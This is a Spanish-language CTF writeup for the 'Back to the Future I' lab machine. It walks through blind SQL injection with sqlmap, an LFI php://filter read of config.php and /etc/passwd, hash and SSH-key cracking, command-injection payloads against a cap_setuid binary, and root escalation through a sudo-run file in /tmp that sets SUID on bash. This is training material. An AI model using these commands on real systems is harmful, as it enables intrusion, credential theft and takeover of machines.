---
layout: post
title: "TheHackerLabs: Back to the Future I - Writeup, SQLi y LFI"
description: "Resuelve Back to the Future I de TheHackerLabs: SQLi, LFI, claves SSH y escalada de privilegios en Linux con cap_setuid."
date: 2026-11-18
last_modified_at: 2026-11-19
img: /assets/img/backtothefuture/Banner.png
tags: [TheHackerLabs, Linux, SQLi, LFI, SSH, Command Injection, Capabilities, PrivEsc, nmap, whatweb, gobuster, sqlmap, hashcat, curl, ftp, john, ssh2john, ssh-keygen, getcap]
---

![Back to the Future I: laboratorio de TheHackerLabs]({{ '/assets/img/backtothefuture/Banner.png' | relative_url }})

## TL;DR

SQLi time-based blind para extraer credenciales → acceso web como marty → LFI con PHP filter para leer config.php → nuevas credenciales → backup.zip por FTP con clave SSH cifrada → passphrase crackeada → acceso SSH como marty → command injection en backup_runner (capability cap_setuid) → escalada a docbrown → sudo NOPASSWD en time_daemon vulnerable (lee /tmp/sync) → escalada a root.

## Introducción

**Back to the Future I** es una máquina de TheHackerLabs, ambientada en el universo de la trilogía cinematográfica. El laboratorio simula una aplicación web temática (“Time Travel Log”) que registra eventos espacio-temporales, y nos reta a explotar una cadena completa de vulnerabilidades: desde una inyección SQL ciega hasta una escalada de privilegios a root, pasando por LFI, filtración de credenciales, acceso FTP, cifrado de claves SSH y configuraciones inseguras de sudo y capabilities de Linux.

A lo largo de este writeup documentamos el proceso completo de explotación, explicando no solo los comandos utilizados sino el razonamiento detrás de cada técnica, para que sirva como referencia de aprendizaje tanto para mí como para otros que enfrenten este lab.

[Descarga el Lab aquí](https://labs.thehackerslabs.com/machine/119)
## Reconocimiento

Comenzamos con la fase de reconocimiento con nuestra herramienta **Auto_Recon**, la que nos facilita esta etapa de manera automatizada.


## Enumeración

![Reconocimiento de servicios](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200134.png)
![Resultados del reconocimiento](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200209.png)

Como vimos en otro laboratorio, `whatweb` nos muestra un error al intentar abrir un dominio.
![Detección del dominio con WhatWeb](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200318.png)

Agregamos este dominio a nuestro archivo `/etc/hosts`

![Configuración del dominio local](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200416.png)

ahora podemos realizar el escaneo de directorios 

![Enumeración de directorios web](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201406.png)


Al investigar en la página nos encontramos con una pista.
![Pista en la página web](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201531.png)

`<!-- ¡El reloj de la torre no tiene nada que ver! ¿O sí? -->`

Además un panel de login.

![Formulario de acceso](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201633.png)

No tenemos éxito 

Ya que no tenemos mayor información, vamos a centrarnos en SQL. Utilizaremos la herramienta `sqlmap`.

```bash
sqlmap -u "http://hillvalley.thl/index.php" --data="username=admin&password=admin" -p username --batch --dbs
```

![Bases de datos identificadas](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118203826.png)

### Que hace este comando? 

1. `-p username` le dice a sqlmap que ataque el parámetro `username`.
2. `--dbs` le pide que liste todas las bases de datos del servidor.
3. `--batch` responde automáticamente a las preguntas de sqlmap (usa valores por defecto).
### Qué mirar? 

1. En la salida apareció `available databases [2]:` con dos bases: `information_schema` y `hillvalley`.
2. `information_schema` es una base estándar de MySQL, sin datos útiles.
3. `hillvalley` es la base de la aplicación. Ahí están las credenciales que buscamos.
## Explotación

Ya que tenemos la información de la base de datos, vamos a lanzar el comando:

```bash
sqlmap -u "http://hillvalley.thl/index.php" --data="username=admin&password=admin" -p username --batch -D hillvalley --tables
```

con `-D` apuntamos a la base de datos que encontramos en el paso anterior.
`--tables` le pedimos a `sqlmap` que liste todas las tablas dentro de la base.

![Tablas de la aplicación](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118204139.png)

El resultado fue la tabla `users`. Y ya que tenemos la base de datos, y el nombre de la tabla, lanzamos el comando:

```bash
sqlmap -u "http://hillvalley.thl/index.php" --data="username=admin&password=admin" -p username --batch -D hillvalley -T users --dump
```

agregamos `-T users` para indicarle el nombre de la tabla que encontramos en el paso anterior y `--dump` para extraer todas las filas y columnas de esa tabla.

![Extracción de la tabla users](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118204504.png)

Ya tenemos información.
![Credenciales de marty](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118205029.png)

Tenemos al usuario `marty` y su contraseña hasheada.
`sqlmap` nos avisa que el crackeo con diccionario en `Python` es muy lento para bcrypt, así que mejor usaremos una herramienta dedicada.

![Aviso sobre recuperación de bcrypt](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118205507.png)

Así que nuestro siguiente paso será guardar el hash y utilizar `hashcat`

```bash 
echo '$2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy' > marty.txt
```

y crackeamos con `hashcat`

```bash
hashcat -m 3200 marty.txt /usr/share/wordlists/rockyou.txt 
```


y el resultado:
![Resultado de Hashcat](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210054.png)

Al ingresar estas credenciales en el login del servicio web tenemos acceso al panel de administración.

![Acceso al panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210220.png)

Tenemos información en el panel

![Información del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210521.png)
![Información del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210533.png)
![Información del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210543.png)
![Información del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210552.png)

![Exploración del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210611.png)
![Detalle del panel de administración](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210434.png)

Probamos LFI para leer las cuentas locales del servidor. La lectura tiene éxito.
El archivo `/etc/passwd` no indica qué usuarios tienen sesiones activas. 

![Lectura de cuentas locales mediante LFI](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118211152.png)

```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin tss:x:100:107:TPM software stack,,,:/var/lib/tpm:/bin/false systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:101:108::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:102:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin avahi:x:104:113:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin fwupd-refresh:x:106:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin saned:x:107:118::/var/lib/saned:/usr/sbin/nologin geoclue:x:108:119::/var/lib/geoclue:/usr/sbin/nologin polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin rtkit:x:109:120:RealtimeKit,,,:/proc:/usr/sbin/nologin colord:x:110:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin docbrown:x:1000:1000:docbrown,,,:/home/docbrown:/bin/bash sshd:x:113:65534::/run/sshd:/usr/sbin/nologin mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false marty:x:1001:1001::/home/marty:/bin/bash ftp:x:115:124:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
```

Encontramos otro usuario llamado `docbrown`. 

Guardamos las cookies de nuestra sesión autenticada en `cookies.txt`, con formato compatible con curl.
Después probamos la lectura del archivo de configuración.

```bash
curl -b cookies.txt "http://hillvalley.thl/admin.php?page=php://filter/convert.base64-encode/resource=config.php"
```

aquí utilizamos
`-b cookies.txt` envía las cookies guardadas en ese archivo junto con la petición. Esto mantiene nuestra sesión autenticada como `marty` en el panel de admin.

`"http://hillvalley.thl/admin.php?page=..."` apunta al panel admin, usando el parámetro `page` que identificamos como vulnerable a LFI.

`php://filter/convert.base64-encode/resource=config.php` es un filtro especial de PHP. En vez de ejecutar `config.php`, le pide a PHP que lea su contenido crudo y lo codifique en base64 antes de mostrarlo.

el resultado nos muestra: 

```bash
<div class="terminal">
            PD9waHANCiRob3N0ID0gImxvY2FsaG9zdCI7DQokdXNlciA9ICJtYXJ0eSI7DQokcGFzcyA9ICJ0MW0zdHJhdmVsIjsNCiRkYiA9ICJoaWxsdmFsbGV5IjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkaG9zdCwgJHVzZXIsICRwYXNzLCAkZGIpOw0KaWYgKCEkY29ubikgew0KICAgIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCj8+DQo=        </div>
    </div>
```

decodificamos 
```bash
echo "PD9waHANCiRob3N0ID0gImxvY2FsaG9zdCI7DQokdXNlciA9ICJtYXJ0eSI7DQokcGFzcyA9ICJ0MW0zdHJhdmVsIjsNCiRkYiA9ICJoaWxsdmFsbGV5IjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkaG9zdCwgJHVzZXIsICRwYXNzLCAkZGIpOw0KaWYgKCEkY29ubikgew0KICAgIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCj8+DQo=" | base64 -d
```
![Configuración de base de datos decodificada](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118212032.png)

y el resultado nos muestra otra contraseña para el usuario `marty`



Al intentar autenticar vía ssh vemos el siguiente error

```bash
┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture]
└─$ ssh marty@hillvalley.thl
marty@hillvalley.thl: Permission denied (publickey).
```
Esto quiere decir que SSH solo acepta clave pública, no contraseña. Esto nos confirma que necesitamos otra vía.. Volviendo al inicio, probaremos con la conexión vía ftp


y entramos de manera correcta. Aquí nos encontramos tres archivos, `backup.zip`, `note_to:marty.txt` y `delorean.png`. La vamos a copiar a nuestro equipo con el comando `get` (este nos permite pasarnos los archivos desde `ftp` a nuestra máquina atacante).

![Archivos disponibles por FTP](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118220855.png)

![Nota del archivo de respaldo](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118221221.png)

```bash
┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture]
└─$ cat .note_to_marty.txt            
Marty, si estás leyendo esto, significa que el Delorean sigue en riesgo.

Tuve que proteger el backup del sitio web. La contraseña es una combinación del modelo del auto y el año del primer viaje temporal... en minúsculas, sin espacios.

¡Nos vemos en el futuro!

—Doc
```

la contraseña es `delorean1955`, datos sacados de la página..

![Extracción del respaldo ZIP](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118221536.png)

tenemos algo muy valioso.. una clave rsa, vamos a confirmar si tiene `passphase`

```bash 
┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture/project]
└─$ ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa": 
```

Como ya sabemos que tiene, vamos a intentar crackearla.

```bash
┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture/project]
└─$ chmod 600 id_rsa
                                                                                                                                                                                                                    
┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture/project]
└─$ ssh2john id_rsa > id_rsa.hash
                                                                                                                                                                                                                    
┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture/project]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
metallica1       (id_rsa)     
1g 0:00:02:44 DONE (2026-11-18 19:19) 0.006082g/s 29.39p/s 29.39c/s 29.39C/s 2222222..onelove1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### Qué es una clave RSA?

1. SSH usa un par de claves: una pública y una privada.
2. La clave pública se coloca en el servidor (`~/.ssh/authorized_keys`).
3. La clave privada se queda con nosotros, nunca se comparte.
4. El servidor verifica que tengamos la clave privada correspondiente, sin necesidad de enviarla por la red.

**Por qué esta clave estaba cifrada:**

1. Una clave privada en texto plano es peligrosa si alguien la roba.
2. Por eso se puede cifrar con una passphrase adicional.
3. Esa passphrase protege la clave, igual que una contraseña protege una cuenta.
4. Necesitamos descubrir la passphrase para utilizar la clave privada.

**Cómo identificamos que estaba cifrada:**

1. Vimos `aes256-ctr` y `bcrypt` en el contenido decodificado del archivo.
2. `aes256-ctr` es el algoritmo que cifra la clave.
3. `bcrypt` es el algoritmo que protege la passphrase, haciendo lento el crackeo por fuerza bruta.

**Cómo se crackeó:**

1. `ssh2john` convierte la clave cifrada en un formato de hash que `john` entiende.
2. `john` prueba contraseñas de una wordlist (rockyou) contra ese hash.
3. Al encontrar la correcta, confirma que esa passphrase descifra la clave.

**Por qué esto es un hallazgo grave en la auditoría:**

1. Encontrar una clave SSH privada en un backup expuesto por FTP ya es grave.
2. Que además tenga una passphrase débil (crackeable con diccionario) la hace doblemente vulnerable.
3. Esto da acceso persistente al sistema, sin depender de la sesión web.

```bash
┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture/project]
└─$ ssh -i id_rsa marty@hillvalley.thl
Enter passphrase for key 'id_rsa': 
Last login: Wed Nov 18 22:21:07 2026 from 192.168.192.139
marty@hillvalley:~$ ls
ftp  user.txt
```
Ya tenemos acceso como `marty` al sistema

```bash
marty@hillvalley:~$ ls -la
total 56
drwxr-xr-x 7 marty    marty    4096 Jul 14  2025 .
drwxr-xr-x 4 root     root     4096 Jul 12  2025 ..
lrwxrwxrwx 1 root     root        9 Jul 13  2025 .bash_history -> /dev/null
-rw-r--r-- 1 marty    marty     220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 marty    marty    3552 Jul 12  2025 .bashrc
drwx------ 4 marty    marty    4096 Jul 12  2025 .cache
drwxr-xr-x 3 marty    marty    4096 Jul 12  2025 .config
-rw-r--r-- 1 marty    marty    5290 Jul 12  2023 .face
lrwxrwxrwx 1 marty    marty       5 Jul 12  2023 .face.icon -> .face
-rw-r--r-- 1 docbrown docbrown   80 Jul 12  2025 .flux_notes
drwxr-xr-x 2 root     root     4096 Jul 12  2025 ftp
drwxr-xr-x 4 marty    marty    4096 Jul 12  2025 .local
-rw-r--r-- 1 marty    marty     807 Mar 29  2024 .profile
drwx------ 2 marty    marty    4096 Jul 14  2025 .ssh
-rw-r--r-- 1 root     root       16 Jul 14  2025 user.txt
marty@hillvalley:~$ cat .flux_notes 
Tiempos inestables... aún necesito arreglar el runner para la próxima prueba.
```

listamos archivos y encontramos la flag de user, y una nota. Buscando mas info no encontramos nada. 

Nos movemos al directorio del usuario `docbrown` y nos encontramos otra pista interesante en un archivo oculto

```bash
marty@hillvalley:/$ cd /home
marty@hillvalley:/home$ ls
docbrown  marty
marty@hillvalley:/home$ cd docbrown/
marty@hillvalley:/home/docbrown$ ls -la
total 88
drwxr-xr-x 15 docbrown docbrown 4096 Jul 15  2025 .
drwxr-xr-x  4 root     root     4096 Jul 12  2025 ..
lrwxrwxrwx  1 root     root        9 Jul 13  2025 .bash_history -> /dev/null
-rw-r--r--  1 docbrown docbrown  220 Jul 11  2025 .bash_logout
-rw-r--r--  1 docbrown docbrown 3662 Jul 12  2025 .bashrc
drwx------ 10 docbrown docbrown 4096 Jul 11  2025 .cache
drwx------  9 docbrown docbrown 4096 Jul 12  2025 .config
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11  2025 Desktop
drwxrwxrwx  2 docbrown docbrown 4096 Jul 12  2025 docs
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11  2025 Documents
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11  2025 Downloads
-rw-r--r--  1 docbrown docbrown 5290 Jul 11  2025 .face
lrwxrwxrwx  1 docbrown docbrown    5 Jul 11  2025 .face.icon -> .face
-rw-r--r--  1 docbrown docbrown  110 Jul 13  2025 .flux_hint
drwx------  4 docbrown docbrown 4096 Jul 11  2025 .local
drwx------  4 docbrown docbrown 4096 Jul 11  2025 .mozilla
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11  2025 Music
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11  2025 Pictures
-rw-r--r--  1 docbrown docbrown  807 Jul 11  2025 .profile
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11  2025 Public
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11  2025 Templates
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11  2025 Videos
-rw-------  1 docbrown docbrown  817 Jul 13  2025 .viminfo
marty@hillvalley:/home/docbrown$ cat .flux_hint 
He estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.
marty@hillvalley:/home/docbrown$                                              

```

Esto nos sugiere que debemos mirar las tareas `cron`.

```bash
marty@hillvalley:/home/docbrown$ cat /etc/crontab                                                            
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#

* * * * * root /usr/local/bin/flux_admin.sh
```

Encontramos un script llamado `flux_admin.sh` que se ejecuta cada minuto como root. Sin embargo, al intentar leer su contenido nos encontramos que no existe en el directorio.

```bash
marty@hillvalley:/home/docbrown$ cat /usr/local/bin/flux_admin.sh
cat: /usr/local/bin/flux_admin.sh: No such file or directory
```

Al buscar en el mismo directorio nos encontramos con dos binarios reales.

```bash
cat: /usr/local/bin/flux_admin.sh: No such file or directory
marty@hillvalley:/home/docbrown$ ls -la  /usr/local/bin              
total 40
drwxr-xr-x  2 root root  4096 Jul 14  2025 .
drwxr-xr-x 10 root root  4096 Jul 11  2025 ..
-rwxr-xr-x  1 root root 16200 Jul 12  2025 backup_runner
-rwx------  1 root root 16296 Jul 14  2025 time_daemon
```

`backup_runner` es ejecutable por todos los usuarios, mientras que `time_daemon` solo por su dueño.

Analizamos `backup_runner` con `strings` y encontramos una pista clave.

```bash
marty@hillvalley:/usr/local/bin$ strings backup_runner 
/lib64/ld-linux-x86-64.so.2
'=ZU
snprintf
puts
exit
setuid
system
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Usage: backup_runner <filename>
tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs
;*3$"
GCC: (Debian 12.2.0-14+deb12u1) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup_runner.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
system@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
usage
exit@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

la línea `tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs`. El programa arma un comando `tar` usando un input sin sanitizar, y lo ejecuta con `system()`. Esto podemos saberlo por la cadena de formato. El `%` es un marcador de formato en C. Significa que el programa toma una variable y la inserta ahí dentro, probablemente con `snprintf()`, y la segunda pista en la lista de símbolos del binario vimos:

```bash
snprintf
puts
exit
setuid
system
```

1. `snprintf` arma el string final combinando el texto fijo (`tar czf /tmp/`, `-backup.tar.gz /home/docbrown/docs`) con tu input, donde estaba el `%s`.
2. `system()` ejecuta ese string resultante como si lo escribieras en una terminal (`sh -c "comando"`).

**Por qué esto es la clave de la vulnerabilidad:**

1. `system()` no valida qué contiene el string antes de ejecutarlo.
2. Si tu input incluye caracteres especiales de shell (`;`, `|`, `&&`, backticks), el shell los interpreta como separadores de comandos.
3. Por eso cuando mandaste `'test; id > /tmp/pwned.txt;'`, el shell lo dividió en 3 comandos distintos, ejecutando cada uno.

**Probamos el binario normal:**

```bash
/usr/local/bin/backup_runner test
```

Al ejecutar este binario, `backup_runner` nos crea un archivo `/tmp/test-backup.tar.gz` con dueño `docbrown`, esto nos reveló el cambio de usuario interno: aunque lo ejecutamos como `marty`, el archivo resultante pertenece a `docbrown`. Esto nos confirma que el programa, en algún momento de su ejecución, cambia de usuario (probablemente mediante `setuid()`)

Nuestro próximo paso será aprovechar la falta de sanitización que identificamos en la cadena `tar czf /tmp/%s-backup.tar.gz`, inyectando comandos adicionales a través del argumento `filename`.

```bash
marty@hillvalley:/usr/local/bin$ /usr/local/bin/backup_runner 'test; id > /tmp/pwned.txt;'
```

Esto hace que el programa arme el string `tar czf /tmp/test; id > /tmp/pwned.txt;-backup.tar.gz /home/docbrown/docs`, el cual `system()` ejecuta como tres comandos separados por `;`. El comando `tar` original falla (archivo vacío), pero el comando inyectado en medio sí se ejecuta con éxito.

Confirmamos

```bash
marty@hillvalley:/usr/local/bin$ cat /tmp/pwned.txt
uid=1000(docbrown) gid=1001(marty) groups=1001(marty)
```

Esto nos confirma una **Inyección de comandos** que nos permite ejecutar código con los privilegios del `docbrown`.

Seguimos con la shell SUID para tener acceso interactivo como `docbrown`

```bash
/usr/local/bin/backup_runner 'test; cp /bin/bash /tmp/docbrown_shell; chmod u+s /tmp/docbrown_shell;'
```

que hace esto?

Copia `bash` a `/tmp/docbrown_shell`, ejecutado con permisos de `docbrown`, el archivo queda con ese dueño, y le agrega el bit de SUID, para que cualquiera que ejecute después correrá con sus permisos.  

```bash
marty@hillvalley:/usr/local/bin$ /usr/local/bin/backup_runner 'test; cp /bin/bash /tmp/docbrown_shell; chmod u+s /tmp/docbrown_shell;'
tar: Cowardly refusing to create an empty archive
Try 'tar --help' or 'tar --usage' for more information.
sh: 1: -backup.tar.gz: not found
marty@hillvalley:/usr/local/bin$ ls -la /tmp/docbrown_shell 
-rwsr-xr-x 1 docbrown marty 1265648 Nov 19 20:18 /tmp/docbrown_shell
marty@hillvalley:/usr/local/bin$ 
```

finalmente ejecutamos.

`/tmp/docbrown_shell -p`

y ganamos una shell con los privilegios de `docbrown` (euid=1000) 

```bash
marty@hillvalley:/usr/local/bin$ /tmp/docbrown_shell -p
docbrown_shell-5.2$ id
uid=1001(marty) gid=1001(marty) euid=1000(docbrown) groups=1001(marty)
```

 Luego de un largo momento buscando información y quedándome atascado, revisé las capabilities de `backup_runner`.

```bash
marty@hillvalley:/home/docbrown$ getcap /usr/local/bin/backup_runner
/usr/local/bin/backup_runner cap_setuid=ep
```

**Qué significa el resultado `cap_setuid=ep`:**

1. `cap_setuid` es la capability específica para poder llamar a la función `setuid()` y cambiar el usuario real del proceso.
2. `e` significa “effective” — la capability está activa mientras el programa corre.
3. `p` significa “permitted” — el programa tiene permiso de usarla.

**Diferencia entre la shell SUID y la capability en este laboratorio:**

1. Con SUID normal, solo cambia nuestra **euid** (efectiva) mientras el proceso corre.
2. Con `cap_setuid`, el programa puede cambiar su **UID real completo** mediante `setuid()`, quedando “siendo” ese usuario de verdad, no solo aparentándolo.
3. Por eso cuando ejecutamos `backup_runner`, el archivo resultante (`test-backup.tar.gz`) quedó con dueño real `docbrown` — el proceso verdaderamente se convirtió en `docbrown` durante su ejecución.
4. Esto explica por qué copiar `bash` y ponerle SUID solo te daba **euid** de `docbrown` (porque heredaba el dueño del archivo), pero no el **UID real** — para tener UID real necesitamos estar **dentro** del proceso que tiene la capability activa, ejecutando la shell desde ahí mismo (con la inyección `; /bin/bash -p ;`), en vez de copiar el binario aparte.

Ejecutamos:

```bash
/usr/local/bin/backup_runner "; /bin/bash -p ;"
```

y ganamos acceso como `docbrown`.

```bash
docbrown@hillvalley:/home/docbrown$ id
uid=1000(docbrown) gid=1001(marty) groups=1001(marty)
docbrown@hillvalley:/home/docbrown$ sudo -l
Matching Defaults entries for docbrown on hillvaley:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User docbrown may run the following commands on hillvaley:
    (root) NOPASSWD: /usr/local/bin/time_daemon
docbrown@hillvalley:/home/docbrown$ 
```
## Escalada de Privilegios

Podemos ver que tenemos acceso a ejecutar `/usr/local/bin/time_daemon` sin necesidad de una contraseña. El comportamiento documentado permite ejecutar comandos desde `/tmp/sync` con privilegios de root.
Creamos ese archivo para modificar los permisos de Bash; no modificamos el binario `time_daemon`.

```bash
echo "chmod +s /bin/bash" > /tmp/sync
```

y ejecutamos 

```bash
docbrown@hillvalley:/home/docbrown$ sudo /usr/local/bin/time_daemon
[88MPH] Sincronización completada. Listo para viajar.
```

comprobamos.

```bash
docbrown@hillvalley:/home/docbrown$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18  2025 /bin/bash
```

y tenemos acceso como root

```bash
docbrown@hillvalley:/home/docbrown$ /bin/bash -p
bash-5.2# id
uid=1000(docbrown) gid=1001(marty) euid=0(root) egid=0(root) groups=0(root),1001(marty)
bash-5.2# whoami
root
bash-5.2# 
```

```bash
bash-5.2# cat notes.txt 
¡Felicidades, viajero del tiempo!

Lograste lo imposible: viajaste al pasado, burlaste sistemas protegidos, superaste obstáculos temporales y... 
¡volviste al futuro con todos los flags en el DeLorean!

Doc estaría orgulloso, y Marty… bueno, seguro todavía está en problemas con Biff. 
Pero vos… vos demostraste que no hay sistema que se te resista ni timeline que no puedas manipular.

    “El futuro no está escrito, todavía. El tuyo será exactamente como lo hagas.”
    — Doc Emmett Brown

Gracias por jugar este CTF inspirado en una de las mejores trilogías de todos los tiempos. 

Si disfrutaste el viaje, no olvides compartir tus hallazgos con otros hackers del tiempo y prepararte para los próximos desafíos que se vienen en la saga.
bash-5.2# 
```



## Lecciones Aprendidas


- **Validación de argumentos en programas:** la falta de sanitización en `backup_runner` permitió inyección de comandos a través de un argumento no validado antes de pasarlo a `system()`.
- **Gestión de credenciales y contraseñas:** se reutilizaron contraseñas débiles (contraseña bcrypt recuperada con rockyou y ZIP con contraseña temática simple), facilitando el movimiento lateral.
- **Principio de menor privilegio:** otorgar `cap_setuid` a un binario con vulnerabilidad de inyección, y permitir `sudo NOPASSWD` sobre un binario que lee comandos de un archivo externo (`/tmp/sync`), rompe el aislamiento entre usuarios.

## Herramientas Usadas
- `nmap`
- `whatweb`
- `gobuster`
- `sqlmap`
- `hashcat`
- `curl`
- `ftp`
- `zip2john` / `john`
- `ssh2john`
- `ssh-keygen`
- `getcap`

---

### 🛡️ Otros Laboratorios y Writeups Relacionados
- [TheHackerLabs: Kaboom - Walkthrough y Writeup](/secnotes/2026/10/24/TheHackerLabs-Kaboom.html)
- [DockerLabs: Los 40 Ladrones - Writeup y Solución](/secnotes/2026/10/18/DockerLabs-Los40ladrones.html)
- [TheHackerLabs: Rockstar - Writeup y Explotación](/secnotes/2026/10/29/TheHackerLabs-Rockstar.html)
